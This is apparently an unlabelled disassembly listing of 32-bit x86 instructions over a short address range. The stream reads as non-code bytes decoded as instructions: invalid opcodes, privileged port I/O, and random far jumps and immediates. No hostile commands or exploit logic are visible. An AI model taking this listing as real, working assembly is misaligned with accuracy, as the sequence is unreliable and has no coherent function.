  41ab50:	retf   0x9d28
  41ab53:	mov    fs,WORD PTR [esi+0x78]
  41ab56:	cmp    DWORD PTR [edi-0x2e],edi
  41ab59:	retf   0xe71e
  41ab5c:	mov    dl,0xe1
  41ab5e:	dec    eax
  41ab5f:	scas   eax,DWORD PTR es:[edi]
  41ab60:	mov    WORD PTR [eax+0x58881ccd],cs
  41ab66:	sbb    al,0xd3
  41ab68:	scas   eax,DWORD PTR es:[edi]
  41ab69:	loope  0x41ab2c
  41ab6b:	rol    DWORD PTR gs:[eax],0xdc
  41ab6f:	aad    0x5e
  41ab71:	ins    BYTE PTR es:[edi],dx
  41ab72:	and    ch,BYTE PTR [esi]
  41ab74:	mov    ds:0xecc22f97,al
  41ab79:	pop    ebx
  41ab7a:	into   
  41ab7b:	fwait
  41ab7c:	sar    BYTE PTR [edi+0x46],cl
  41ab7f:	in     eax,dx
  41ab80:	sbb    BYTE PTR cs:[edi],0x58
  41ab84:	enter  0x8368,0xb0
  41ab88:	je     0x41abd5
  41ab8a:	pop    DWORD PTR [ebp-0x7f72f0c3]
  41ab90:	fidiv  WORD PTR [edx+0x52]
  41ab93:	mov    eax,ds:0xbe808084
  41ab98:	pop    esi
  41ab99:	ds (bad) 
  41ab9b:	mov    ebx,0xa4f3c8eb
  41aba0:	pop    ebx
  41aba1:	pop    ds
  41aba2:	add    al,0xa1
  41aba4:	pusha  
  41aba5:	out    0xb9,al
  41aba7:	ret    0x79e6
  41abaa:	jno    0x41ac18
  41abac:	in     eax,dx
  41abad:	push   cs
  41abae:	sti    
  41abaf:	adc    DWORD PTR [ebx-0x2d],esp
  41abb2:	sub    BYTE PTR [esi],0xa1
  41abb5:	loop   0x41ac24
  41abb7:	cwde   
  41abb8:	repnz cli 
  41abba:	popf   
  41abbb:	xchg   edx,eax
  41abbc:	in     eax,dx
  41abbd:	stos   BYTE PTR es:[edi],al
  41abbe:	cmp    eax,0x48eae3df
  41abc3:	mov    ss,ebx
  41abc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc6:	addr16 ret 0x5a01
  41abca:	ds dec ecx
  41abcc:	dec    ecx
  41abcd:	pop    edi
  41abce:	jl     0x41ac0e
  41abd0:	mov    BYTE PTR [eax-0x6],cl
  41abd3:	into   
  41abd4:	into   
  41abd5:	cs mov bh,0xa4
  41abd8:	aad    0x63
  41abda:	(bad)  cs:[edx]
  41abdd:	sbb    ecx,DWORD PTR [edx-0x9393a14]
  41abe3:	xchg   ebx,eax
  41abe4:	fld    DWORD PTR [eax-0x71ef6f60]
  41abea:	stos   DWORD PTR es:[edi],eax
  41abeb:	inc    esp
  41abec:	xchg   edi,eax
  41abed:	or     eax,0xe093db21
  41abf2:	push   ds
  41abf3:	push   es
  41abf4:	mov    al,0x31
  41abf6:	js     0x41ac77
  41abf8:	fcmovnb st,st(0)
  41abfa:	and    DWORD PTR [edi-0x34],0x4b
  41abfe:	jmp    0x724efb50
  41ac03:	mov    bh,BYTE PTR [ecx+0x43]
  41ac06:	sub    eax,0xeaa66c0b
  41ac0b:	dec    esp
  41ac0c:	xlat   BYTE PTR ds:[ebx]
  41ac0d:	mov    ecx,eax
  41ac0f:	fwait
  41ac10:	mov    edx,0xd190571
  41ac15:	xlat   BYTE PTR ds:[ebx]
  41ac16:	xor    cl,BYTE PTR [edi]
  41ac18:	enter  0xcd9a,0x94
  41ac1c:	jo     0x41ac39
  41ac1e:	sub    edi,DWORD PTR [edx]
  41ac20:	call   DWORD PTR [ebx+0x77]
  41ac23:	cs jnp 0x41ac96
  41ac26:	sub    eax,0x39affcd9
  41ac2b:	add    BYTE PTR ds:0xf8f58297,al
  41ac31:	loop   0x41ac4a
  41ac33:	mov    BYTE PTR [edi+0x4d],ah
  41ac36:	stos   DWORD PTR es:[edi],eax
  41ac37:	fisttp QWORD PTR [ebx-0x5f]
  41ac3a:	xchg   BYTE PTR [ebx+0x526e93c3],dh
  41ac40:	lds    edi,FWORD PTR [ecx]
  41ac42:	mov    bl,0x7f
  41ac44:	cmp    DWORD PTR [edx+eiz*4-0xe],edx
  41ac48:	pop    ebp
  41ac49:	cdq    
  41ac4a:	fwait
  41ac4b:	pusha  
  41ac4c:	and    eax,DWORD PTR [ecx+0x23336b67]
  41ac52:	adc    DWORD PTR [ecx+eax*8-0x72],0xffffffe6
  41ac57:	adc    cl,BYTE PTR [eax]
  41ac59:	jb     0x41abe5
  41ac5b:	sbb    al,0xe9
  41ac5d:	or     ch,ah
  41ac5f:	push   es
  41ac60:	cwde   
  41ac61:	jbe    0x41acdf
  41ac63:	fcomp  st(1)
  41ac65:	in     al,dx
  41ac66:	retf   0xa730
  41ac69:	test   eax,0xc57e4b23
  41ac6e:	jle    0x41ac33
  41ac70:	fldenv [edx]
  41ac72:	sar    DWORD PTR [ebx+0x3a],1
  41ac75:	out    0x57,al
  41ac77:	dec    ebp
  41ac78:	mov    ebx,edx
  41ac7a:	ins    DWORD PTR es:[edi],dx
  41ac7b:	sub    eax,0x400350e
  41ac80:	daa    
  41ac81:	add    BYTE PTR [ebp+0x71],cl
  41ac84:	jo     0x41ac83
  41ac86:	sbb    ebp,DWORD PTR [esi-0x2b]
  41ac89:	rcr    BYTE PTR [ecx+0xc6d12af],0x13
  41ac90:	test   DWORD PTR [ecx+0x2f],ebx
  41ac93:	dec    ebx
  41ac94:	in     eax,dx
  41ac95:	inc    ebp
  41ac96:	ret    0xaded
  41ac99:	retf   
  41ac9a:	push   0x47
  41ac9c:	sub    eax,0x85ee5c46
  41aca1:	adc    ebp,DWORD PTR [edi]
  41aca3:	cmc    
  41aca4:	test   eax,ebp
  41aca6:	pushf  
  41aca7:	cmp    DWORD PTR [ebp+ebx*2+0x78eae707],0xffffffcf
  41acaf:	inc    edi
  41acb0:	mov    eax,ds:0xbea476ec
  41acb5:	clc    
  41acb6:	stos   DWORD PTR es:[edi],eax
  41acb7:	ins    BYTE PTR es:[edi],dx
  41acb8:	and    al,0x47
  41acba:	div    BYTE PTR [ebp+0x6]
  41acbd:	mov    edx,0x818179fe
  41acc2:	add    edi,DWORD PTR [edx+0x38]
  41acc5:	ins    BYTE PTR es:[edi],dx
  41acc6:	push   0x43
  41acc8:	cld    
  41acc9:	push   0xdd1abc13
  41acce:	add    eax,0xa855731a
  41acd3:	push   0x4ecad0a1
  41acd8:	pusha  
  41acd9:	push   esp
  41acda:	enter  0x1a41,0xd6
  41acde:	out    dx,al
  41acdf:	(bad)  
  41ace0:	iret   
  41ace1:	push   esp
  41ace2:	sar    DWORD PTR [edx],cl
  41ace4:	not    BYTE PTR [esi]
  41ace6:	scas   eax,DWORD PTR es:[edi]
  41ace7:	imul   ebp,ebx,0x36
  41acea:	daa    
  41aceb:	mov    al,0x50
  41aced:	inc    edx
  41acee:	(bad)  
  41acef:	pop    esp
  41acf0:	mov    edx,0x3321d737
  41acf5:	add    eax,DWORD PTR [edx]
  41acf7:	xor    al,0x81
  41acf9:	data16 mov ds:0x2a069e30,al
  41acff:	arpl   WORD PTR [edx-0x3d8734a3],dx
  41ad05:	std    
  41ad06:	cwde   
  41ad07:	xchg   esi,ecx
  41ad09:	inc    ebp
  41ad0a:	xor    al,0x32
  41ad0c:	leave  
  41ad0d:	shl    cl,1
  41ad0f:	add    dh,BYTE PTR [edi]
  41ad11:	arpl   WORD PTR [ebx],di
  41ad13:	out    dx,eax
  41ad14:	add    ecx,ecx
  41ad16:	pop    es
  41ad17:	xlat   BYTE PTR ds:[ebx]
  41ad18:	fs adc al,0x54
  41ad1b:	inc    esp
  41ad1c:	or     ecx,ebp
  41ad1e:	xchg   BYTE PTR [ebx+esi*2+0x7cdc4009],ch
  41ad25:	imul   ebp,DWORD PTR [eax+0xadbf9fd],0x40a194cb
  41ad2f:	add    al,0x93
  41ad31:	adc    eax,0xc4374bae
  41ad36:	lea    edx,[eax]
  41ad38:	arpl   si,ax
  41ad3a:	or     al,BYTE PTR [ecx+0x1a]
  41ad3d:	mov    ecx,0x3af1b007
  41ad42:	jae    0x41ada1
  41ad44:	dec    BYTE PTR [eax+0x108417ab]
  41ad4a:	cmp    DWORD PTR [eax+0x5b],ebp
  41ad4d:	call   0x7a1c27cb
  41ad52:	mov    bl,0xa0
  41ad54:	ss dec eax
  41ad56:	ja     0x41ad39
  41ad58:	sbb    BYTE PTR [ecx+ebx*2],dh
  41ad5b:	sar    DWORD PTR [ebp+0x23],0xb2
  41ad5f:	dec    eax
  41ad60:	or     al,0xc0
  41ad62:	sub    al,BYTE PTR [eax-0xa]
  41ad65:	adc    eax,DWORD PTR [ecx]
  41ad67:	dec    ebp
  41ad68:	rol    DWORD PTR [ecx],cl
  41ad6a:	push   ss
  41ad6b:	cmp    ebx,DWORD PTR [edx-0xb656991]
  41ad71:	fidiv  DWORD PTR [ebx]
  41ad73:	mov    eax,ds:0x444f98ee
  41ad78:	ins    DWORD PTR es:[edi],dx
  41ad79:	xchg   esi,eax
  41ad7a:	jno    0x41ad65
  41ad7c:	pop    ebp
  41ad7d:	add    ebx,DWORD PTR [ecx+0x10503d23]
  41ad83:	nop
  41ad84:	jae    0x41ade6
  41ad86:	xor    edi,ebp
  41ad88:	lods   al,BYTE PTR ds:[esi]
  41ad89:	sub    BYTE PTR [ebx],bh
  41ad8b:	jmp    0xd029:0x8112bc7d
  41ad92:	in     al,dx
  41ad93:	jle    0x41ad87
  41ad95:	scas   al,BYTE PTR es:[edi]
  41ad96:	jnp    0x41adcc
  41ad98:	ins    BYTE PTR es:[edi],dx
  41ad99:	pop    esi
  41ad9a:	dec    edi
  41ad9b:	jle    0x41ade5
  41ad9d:	xor    edx,DWORD PTR [eax-0x62]
  41ada0:	dec    edx
  41ada1:	xor    dl,0xb2
  41ada4:	mov    WORD PTR [ecx],cs
  41ada6:	pop    eax
  41ada7:	clc    
  41ada8:	(bad)  
  41ada9:	mov    edi,0xd3411b39
  41adae:	push   ecx
  41adaf:	xchg   esi,eax
  41adb0:	xor    ebp,ebp
  41adb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adb3:	or     eax,0x994720b6
  41adb8:	adc    al,0x87
  41adba:	fs rcl edi,0x2f
  41adbe:	bound  ebp,QWORD PTR [ecx]
  41adc0:	jo     0x41adbe
  41adc2:	mov    bh,0x5b
  41adc4:	fld    QWORD PTR [eax-0x7]
  41adc7:	and    BYTE PTR [edx+edi*8],0x9f
  41adcb:	xor    eax,0x9ec2c6da
  41add0:	xor    eax,0x5b2be498
  41add5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add6:	lods   eax,DWORD PTR ds:[esi]
  41add7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add8:	add    eax,0x7c8d1102
  41addd:	pop    ds
  41adde:	cmp    ecx,DWORD PTR [edi-0x673d57a9]
  41ade4:	dec    ebx
  41ade5:	popf   
  41ade6:	scas   eax,DWORD PTR es:[edi]
  41ade7:	lock fs dec ebp
  41adea:	lods   al,BYTE PTR ds:[esi]
  41adeb:	and    DWORD PTR [edx+0x29],esi
  41adee:	out    dx,eax
  41adef:	xchg   ecx,eax
  41adf0:	aas    
  41adf1:	jb     0x41ae5a
  41adf3:	sub    al,0x62
  41adf5:	ins    BYTE PTR es:[edi],dx
  41adf6:	cmp    eax,0xb80acab9
  41adfb:	jge    0x41addb
  41adfd:	mov    bl,0xad
  41adff:	ds mov eax,0x8fcbcfc0
  41ae05:	adc    eax,0xd7d9c27e
  41ae0a:	push   edi
  41ae0b:	fldenv [edi-0x58]
  41ae0e:	(bad)  
  41ae0f:	sbb    cl,bh
  41ae11:	repnz fadd DWORD PTR [edi+0x38]
  41ae15:	int3   
  41ae16:	push   esi
  41ae17:	adc    BYTE PTR [ecx],ch
  41ae19:	or     ch,ah
  41ae1b:	sahf   
  41ae1c:	daa    
  41ae1d:	dec    ecx
  41ae1e:	sbb    DWORD PTR [ebx],0x259df8eb
  41ae24:	jmp    0x41ae63
  41ae26:	fwait
  41ae27:	mov    ah,0x2a
  41ae29:	adc    eax,0xa6783d29
  41ae2e:	mov    edx,0x3299f3aa
  41ae33:	xor    BYTE PTR [esi-0xe],ah
  41ae36:	inc    eax
  41ae37:	jne    0x41aea8
  41ae39:	aas    
  41ae3a:	pop    edi
  41ae3b:	or     BYTE PTR [eax+0x57ce093],al
  41ae41:	adc    dl,bl
  41ae43:	mov    WORD PTR [ecx],cs
  41ae45:	out    dx,eax
  41ae46:	int3   
  41ae47:	xor    eax,DWORD PTR [edi-0xbb52d4f]
  41ae4d:	fs adc eax,0xbac55326
  41ae53:	cwde   
  41ae54:	outs   dx,DWORD PTR ds:[esi]
  41ae55:	xchg   BYTE PTR [edi-0x59],al
  41ae58:	jecxz  0x41ae23
  41ae5a:	pushf  
  41ae5b:	repz mov ecx,0x25742c23
  41ae61:	or     ah,BYTE PTR [ebx]
  41ae63:	dec    ebp
  41ae65:	pop    edx
  41ae66:	out    0x75,eax
  41ae68:	push   0x5a942f10
  41ae6d:	retf   
  41ae6e:	aas    
  41ae6f:	stc    
  41ae70:	jo     0x41ae0c
  41ae72:	call   0xc7e0:0xefea7a24
  41ae79:	loope  0x41aebd
  41ae7b:	in     eax,dx
  41ae7c:	push   esi
  41ae7d:	sbb    dl,BYTE PTR [edi+0x4f]
  41ae80:	loop   0x41aea6
  41ae82:	cmp    DWORD PTR [edi],ecx
  41ae84:	pop    esi
  41ae85:	aaa    
  41ae86:	not    eax
  41ae88:	sub    DWORD PTR [eax],0x5a
  41ae8b:	jmp    0x41ae0f
  41ae8d:	sti    
  41ae8e:	bound  esp,QWORD PTR [eax+0x3b]
  41ae91:	addr16 (bad) 
  41ae93:	sub    BYTE PTR [edx-0x6e869a17],0x86
  41ae9a:	mov    ah,0xb3
  41ae9c:	stos   DWORD PTR es:[edi],eax
  41ae9d:	gs aam 0x35
  41aea0:	data16 mov al,ds:0x93faa789
  41aea6:	jno    0x41af14
  41aea8:	sbb    ah,dl
  41aeaa:	imul   esp,DWORD PTR ds:0xb9ee67b3,0xa
  41aeb1:	out    dx,eax
  41aeb2:	cli    
  41aeb3:	jae    0x41af23
  41aeb5:	gs ins BYTE PTR es:[edi],dx
  41aeb7:	pop    esp
  41aeb8:	or     DWORD PTR [ecx],eax
  41aeba:	push   ss
  41aebb:	xor    al,0x93
  41aebd:	push   ds
  41aebe:	iret   
  41aebf:	or     edi,DWORD PTR [edx-0x2c]
  41aec2:	into   
  41aec3:	adc    esi,DWORD PTR [ecx-0x1f]
  41aec6:	in     eax,0x9b
  41aec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec9:	mov    ch,0xc3
  41aecb:	inc    ecx
  41aecc:	push   ebp
  41aecd:	and    al,0xc8
  41aed0:	push   cs
  41aed1:	mov    dl,0xe
  41aed3:	sbb    DWORD PTR [ebp+0x68fc4647],esp
  41aed9:	shr    dl,cl
  41aedb:	enter  0xc4,0x86
  41aedf:	mov    eax,ds:0x4043e573
  41aee4:	adc    DWORD PTR [edx-0x55],edx
  41aee7:	push   edi
  41aee8:	xchg   dx,ax
  41aeea:	fisttp DWORD PTR [ebx]
  41aeec:	mov    gs,WORD PTR [ebp-0x54075d00]
  41aef2:	stc    
  41aef3:	je     0x41af6a
  41aef5:	clc    
  41aef6:	test   eax,0x88429b90
  41aefb:	ja     0x41ae9f
  41aefd:	jns    0x41ae91
  41aeff:	cmp    ebp,esp
  41af01:	sub    eax,0xd817db8c
  41af06:	sbb    esp,edi
  41af08:	pop    edx
  41af09:	mov    WORD PTR [ecx+esi*2+0x5a],cs
  41af0d:	daa    
  41af0e:	test   DWORD PTR [ebx-0x72],eax
  41af11:	(bad)  
  41af12:	push   ss
  41af13:	cdq    
  41af14:	mov    ch,0xd6
  41af16:	stos   BYTE PTR es:[edi],al
  41af17:	or     ah,dl
  41af19:	dec    DWORD PTR gs:[eax+0x3df76174]
  41af20:	mov    eax,fs
  41af22:	pusha  
  41af23:	enter  0x462d,0x27
  41af27:	push   eax
  41af28:	inc    edi
  41af29:	icebp  
  41af2a:	pop    edx
  41af2b:	add    al,0x7c
  41af2d:	iret   
  41af2e:	dec    esp
  41af2f:	add    eax,0x5791ea7
  41af34:	test   BYTE PTR [ebp+ebx*2-0x1fdf5075],ch
  41af3b:	in     eax,0x3d
  41af3d:	or     al,0x7
  41af3f:	xor    al,0x6c
  41af41:	inc    esp
  41af42:	inc    edi
  41af43:	and    edi,DWORD PTR [eax+0x3e]
  41af46:	add    BYTE PTR [ebx+0x15],bh
  41af49:	ret    0x3467
  41af4c:	ds popf 
  41af4e:	jle    0x41af99
  41af50:	into   
  41af51:	retfw  0xcc46
  41af55:	js     0x41af64
  41af57:	add    edi,DWORD PTR [edi+edx*1+0x32]
  41af5b:	mov    ecx,0x25d6a1dc
  41af60:	push   esp
  41af61:	mul    DWORD PTR [edi]
  41af63:	out    dx,al
  41af64:	out    0x40,eax
  41af66:	arpl   si,di
  41af68:	pop    es
  41af69:	mov    eax,ds:0x24203bb9
  41af6e:	and    DWORD PTR [edi+0x2f1092de],edx
  41af74:	or     DWORD PTR [edi+eiz*8+0x75],eax
  41af78:	ror    BYTE PTR [ebx+0x33],1
  41af7b:	lods   eax,DWORD PTR ds:[esi]
  41af7c:	mov    esi,0xc5ead0c0
  41af81:	mov    al,0x41
  41af83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af84:	adc    eax,DWORD PTR [eax]
  41af86:	xorps  xmm1,xmm1
  41af89:	jae    0x41af96
  41af8b:	sub    edx,edx
  41af8d:	and    al,0xf7
  41af8f:	jl     0x41af59
  41af91:	fisubr WORD PTR [edi]
  41af93:	xchg   ecx,eax
  41af94:	mov    ebp,0xefe8762e
  41af99:	push   0x93c7baab
  41af9e:	xlat   BYTE PTR ds:[ebx]
  41af9f:	cmp    DWORD PTR [ecx+ecx*1],ecx
  41afa2:	jno    0x41af4d
  41afa4:	xchg   DWORD PTR [ebp+0x7f187cab],esi
  41afaa:	xchg   BYTE PTR [edi+0x5c],ch
  41afad:	push   edx
  41afae:	mov    ds:0x109570a1,al
  41afb3:	push   esp
  41afb4:	fsin   
  41afb6:	inc    eax
  41afb7:	lods   al,BYTE PTR ds:[esi]
  41afb8:	inc    ebx
  41afb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afba:	mov    ch,0xce
  41afbc:	retf   0xede0
  41afbf:	xor    DWORD PTR es:[ebp+0x43b8f3b3],0x4c
  41afc7:	mov    edi,0x2e6bbcb0
  41afcc:	and    dh,BYTE PTR [edx+0x28c0ffec]
  41afd2:	jbe    0x41b029
  41afd4:	add    al,0x30
  41afd6:	push   ebp
  41afd7:	fisub  DWORD PTR [edi+ecx*2+0x1b]
  41afdb:	sub    al,0x9e
  41afdd:	push   0x2e
  41afdf:	adc    DWORD PTR [esi-0x7b],ecx
  41afe2:	cmc    
  41afe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afe4:	push   0xffffffa0
  41afe6:	mov    bl,0x55
  41afe8:	xchg   ebp,eax
  41afe9:	push   eax
  41afea:	ja     0x41af7b
  41afec:	test   DWORD PTR [esi+0x7ea8fcea],esp
  41aff2:	jl     0x41affa
  41aff4:	cmp    eax,ebx
  41aff6:	push   eax
  41aff7:	daa    
  41aff8:	jmp    0x41b043
  41affa:	push   ebx
  41affb:	arpl   sp,si
  41affd:	clc    
  41affe:	cmp    ebx,DWORD PTR [ebx-0x20]
  41b001:	jno    0x41afab
  41b003:	xor    DWORD PTR [edi+ebx*4+0x48],eax
  41b007:	xchg   ebx,eax
  41b008:	push   cs
  41b009:	shl    BYTE PTR [ebp+0x20],1
  41b00c:	test   al,0xb8
  41b00e:	mov    al,0x75
  41b010:	push   0xffffffcd
  41b012:	pop    edi
  41b013:	imul   ebx,DWORD PTR [ebp+0x3ab73c40],0xffffff92
  41b01a:	fist   DWORD PTR [edi]
  41b01c:	or     dl,ch
  41b01e:	inc    edx
  41b01f:	call   0x62b:0x77d32ff6
  41b026:	(bad)  
  41b027:	jnp    0x41b03f
  41b029:	jnp    0x41b000
  41b02b:	dec    ebx
  41b02c:	sub    edi,DWORD PTR [esi+0x19893cd9]
  41b032:	fidivr DWORD PTR [edx]
  41b034:	mov    dh,0x13
  41b036:	and    DWORD PTR [edi+0x82850b7],esp
  41b03c:	stc    
  41b03d:	cld    
  41b03e:	outs   dx,DWORD PTR ds:[esi]
  41b03f:	push   ebx
  41b040:	jae    0x41afea
  41b042:	xchg   ebx,eax
  41b043:	inc    edx
  41b044:	scas   eax,DWORD PTR es:[edi]
  41b045:	pop    es
  41b046:	rcl    BYTE PTR [eax],0xea
  41b049:	sub    DWORD PTR [eax],edi
  41b04b:	inc    eax
  41b04c:	addr16 in al,0x5d
  41b04f:	mov    ebx,0x677c2fdc
  41b054:	cmp    bl,BYTE PTR [ecx]
  41b056:	addr16 aad 0xb1
  41b059:	inc    edx
  41b05a:	xchg   esp,eax
  41b05b:	ror    BYTE PTR [edx-0x45],cl
  41b05e:	add    ecx,esi
  41b060:	cdq    
  41b061:	push   ds
  41b062:	aam    0x70
  41b064:	call   0x3408454b
  41b069:	mov    dl,0x96
  41b06b:	into   
  41b06c:	xor    ch,bl
  41b06e:	stos   BYTE PTR es:[edi],al
  41b06f:	push   ds
  41b070:	cld    
  41b071:	sbb    ch,al
  41b073:	je     0x41b037
  41b075:	dec    ebx
  41b076:	add    ebp,DWORD PTR [ebp+edx*2-0x5a2f077c]
  41b07d:	or     eax,DWORD PTR [ebx-0x7102c1ce]
  41b083:	fldenv [bp+si-0x50]
  41b087:	pop    ds
  41b088:	jae    0x41b0e0
  41b08a:	mov    ecx,0xdadec94e
  41b08f:	loopne 0x41b053
  41b091:	sbb    eax,0x10b5ebb2
  41b096:	dec    esi
  41b097:	pop    ecx
  41b098:	sbb    al,0x4f
  41b09a:	dec    ecx
  41b09b:	cmp    cl,dl
  41b09d:	mov    edi,0x1463d593
  41b0a2:	mov    al,ds:0xb1b77968
  41b0a7:	and    esp,esi
  41b0a9:	lods   eax,DWORD PTR ds:[esi]
  41b0aa:	pop    ds
  41b0ab:	mov    eax,0x6f28b621
  41b0b0:	repz or al,0x5
  41b0b3:	jecxz  0x41b056
  41b0b5:	ret    0xbbaa
  41b0b8:	cld    
  41b0b9:	sar    BYTE PTR [eax],0x10
  41b0bc:	popf   
  41b0bd:	adc    al,bl
  41b0bf:	inc    edx
  41b0c0:	fnstenv [edi+ecx*8+0x68db34d8]
  41b0c7:	xchg   esi,eax
  41b0c8:	jle    0x41b0f6
  41b0ca:	jae    0x41b115
  41b0cc:	repz mov eax,ds:0x8ea3f38
  41b0d2:	pop    edi
  41b0d3:	xor    bh,BYTE PTR [esp+edx*8-0x663d38bf]
  41b0da:	mov    al,0x86
  41b0dc:	test   al,0x99
  41b0de:	lock scas al,BYTE PTR es:[edi]
  41b0e0:	jl     0x41b089
  41b0e2:	clc    
  41b0e3:	or     ebp,0xfffffff0
  41b0e6:	lds    edi,FWORD PTR [ecx+ebx*4]
  41b0e9:	xlat   BYTE PTR ds:[ebx]
  41b0ea:	add    BYTE PTR [edx-0x72],0x8f
  41b0ee:	add    DWORD PTR [edi+edx*4-0x3e96ab07],esp
  41b0f5:	mov    al,0xf4
  41b0f7:	adc    edx,DWORD PTR [ecx]
  41b0f9:	(bad)  
  41b0fa:	cli    
  41b0fb:	xor    DWORD PTR [edi-0x29],0x8ecdbd64
  41b102:	ins    DWORD PTR es:[edi],dx
  41b103:	push   0xffffff8d
  41b105:	retf   0xa770
  41b108:	push   edi
  41b109:	add    DWORD PTR [edi+0x16],ebp
  41b10c:	mov    al,ds:0x1dce9bc4
  41b111:	repz pop ds
  41b113:	pop    ecx
  41b114:	pop    edi
  41b115:	mov    BYTE PTR [ebp+0x5b],dh
  41b118:	into   
  41b119:	jmp    0x415f8e4a
  41b11e:	imul   edi,DWORD PTR [ebx-0x14],0x4cae1049
  41b125:	cmc    
  41b126:	sbb    eax,0x9a871939
  41b12b:	pop    ecx
  41b12c:	ror    bl,1
  41b12e:	out    dx,eax
  41b12f:	cdq    
  41b130:	jp     0x41b196
  41b132:	retf   
  41b133:	out    0x87,al
  41b135:	inc    ecx
  41b136:	adc    eax,0x81751de
  41b13b:	mov    edx,0x60e79881
  41b140:	mov    ah,0xb4
  41b142:	xchg   DWORD PTR [eax-0x18],esp
  41b145:	fwait
  41b146:	xchg   edi,eax
  41b147:	dec    ebp
  41b148:	push   esi
  41b149:	aas    
  41b14a:	shr    BYTE PTR [eax+0x151690c1],cl
  41b150:	hlt    
  41b151:	ffreep st(6)
  41b153:	xor    bh,al
  41b155:	mov    bh,BYTE PTR [edi-0x1c]
  41b158:	js     0x41b164
  41b15a:	or     BYTE PTR [esi],dh
  41b15c:	xlat   BYTE PTR ds:[ebx]
  41b15d:	jne    0x41b0e7
  41b15f:	xchg   ebx,eax
  41b160:	stos   BYTE PTR es:[edi],al
  41b161:	cs pop edi
  41b163:	ror    dh,0xfb
  41b166:	jmp    0x92c05917
  41b16b:	sbb    al,0x47
  41b16d:	mov    esi,0x71f9301d
  41b172:	sbb    eax,DWORD PTR [esi+ebp*1-0x69]
  41b176:	xor    ch,BYTE PTR [ecx]
  41b178:	les    ecx,FWORD PTR [edi-0x2a53f418]
  41b17e:	push   ebx
  41b17f:	mov    al,ds:0xa1122c18
  41b184:	addr16 add edi,0x67
  41b188:	mov    ds:0x72a2885,eax
  41b18d:	and    eax,0x9651e24
  41b193:	loope  0x41b1bd
  41b195:	xor    ch,BYTE PTR [ebx-0x2a]
  41b198:	int    0x2
  41b19a:	mov    ebp,0x9230ea6
  41b19f:	in     al,dx
  41b1a0:	jno    0x41b209
  41b1a2:	add    BYTE PTR [ebp-0x60315bf5],dh
  41b1a8:	xchg   BYTE PTR [ebx+0x13e9246e],dl
  41b1ae:	mov    esp,0x18fa1af
  41b1b3:	xchg   ecx,eax
  41b1b4:	fs push ss
  41b1b6:	inc    edi
  41b1b7:	out    0xeb,eax
  41b1b9:	pop    edx
  41b1ba:	call   0xd61eb01e
  41b1bf:	xchg   ebx,eax
  41b1c0:	inc    ebp
  41b1c1:	cmp    ch,BYTE PTR [edi-0xb483e26]
  41b1c7:	jb     0x41b16e
  41b1c9:	dec    ebp
  41b1ca:	jle    0x41b14e
  41b1cc:	xchg   esp,eax
  41b1cd:	iret   
  41b1ce:	iret   
  41b1cf:	inc    ebp
  41b1d0:	mov    esi,0xf68268bf
  41b1d5:	stc    
  41b1d6:	(bad)  
  41b1d7:	out    dx,eax
  41b1d8:	jmp    0x69c0:0x5cf83dc8
  41b1df:	jno    0x41b256
  41b1e1:	out    0xbd,eax
  41b1e3:	push   esp
  41b1e4:	xor    BYTE PTR [ecx-0x33],dh
  41b1e7:	call   0x6c252e31
  41b1ec:	out    0xe7,al
  41b1ee:	test   eax,0x78bb38a9
  41b1f3:	mov    ebx,0x7493f13d
  41b1f8:	push   0xffffffbf
  41b1fa:	jecxz  0x41b255
  41b1fc:	in     al,dx
  41b1fd:	scas   eax,DWORD PTR es:[edi]
  41b1fe:	mov    dh,0xa0
  41b200:	adc    BYTE PTR [eax+0x4d09d110],bl
  41b206:	dec    edx
  41b207:	dec    ebx
  41b208:	fld    QWORD PTR [eax-0x4d5d9f46]
  41b20e:	mov    ds:0x4e6e7d6,al
  41b213:	or     BYTE PTR ds:0x854de48a,dl
  41b219:	fadd   QWORD PTR [ebp+edi*8+0x428a966e]
  41b220:	jmp    0xe3cacff9
  41b225:	fwait
  41b226:	lea    esi,[edi+0x31f9f92d]
  41b22c:	dec    eax
  41b22d:	jbe    0x41b29e
  41b22f:	inc    ebp
  41b230:	xchg   ecx,eax
  41b231:	xor    al,0xe3
  41b233:	xchg   edx,eax
  41b234:	sahf   
  41b235:	ficom  WORD PTR [ebp+0x79]
  41b238:	fld    DWORD PTR [edx-0x6c0fa2e6]
  41b23e:	xchg   BYTE PTR [eax+0x0],ah
  41b241:	inc    ecx
  41b242:	cmc    
  41b243:	xchg   ebp,eax
  41b244:	aam    0x9b
  41b246:	mov    bl,0x77
  41b248:	loopne 0x41b272
  41b24a:	out    dx,eax
  41b24b:	mov    dh,0x7b
  41b24d:	(bad)  
  41b24e:	es (bad) 
  41b250:	jno    0x41b27c
  41b252:	ja     0x41b28d
  41b254:	sahf   
  41b255:	mov    ebx,0xfeda21fa
  41b25a:	mov    eax,esi
  41b25c:	sub    edi,DWORD PTR [ebx-0x31]
  41b25f:	sub    al,0x2a
  41b261:	mov    ebx,0x1d77f087
  41b266:	scas   al,BYTE PTR es:[edi]
  41b267:	jb     0x41b2cc
  41b269:	cmp    dl,BYTE PTR [edx]
  41b26b:	adc    al,0x80
  41b26d:	loope  0x41b2b4
  41b26f:	ret    
  41b270:	dec    esp
  41b271:	test   DWORD PTR [eax-0xae36567],0x2df35f9e
  41b27b:	xchg   edx,eax
  41b27c:	aam    0xf0
  41b27e:	mov    eax,0xd524681f
  41b283:	inc    esp
  41b284:	cmc    
  41b285:	fbstp  TBYTE PTR [esi+0x56]
  41b288:	mov    dl,0x79
  41b28a:	xchg   ecx,eax
  41b28b:	lahf   
  41b28c:	in     eax,dx
  41b28d:	cdq    
  41b28e:	aam    0xc3
  41b290:	aas    
  41b291:	jmp    0x41b254
  41b293:	loop   0x41b23d
  41b295:	xchg   ebx,eax
  41b296:	repz out 0xe7,al
  41b299:	popa   
  41b29a:	pop    ds
  41b29b:	sbb    eax,0x2ab6c1ea
  41b2a0:	aad    0xbb
  41b2a2:	and    DWORD PTR ds:0xb0aaed16,edx
  41b2a8:	(bad)  
  41b2a9:	retf   0x8d38
  41b2ac:	or     cl,BYTE PTR ds:0x37a22c55
  41b2b2:	das    
  41b2b3:	dec    ebx
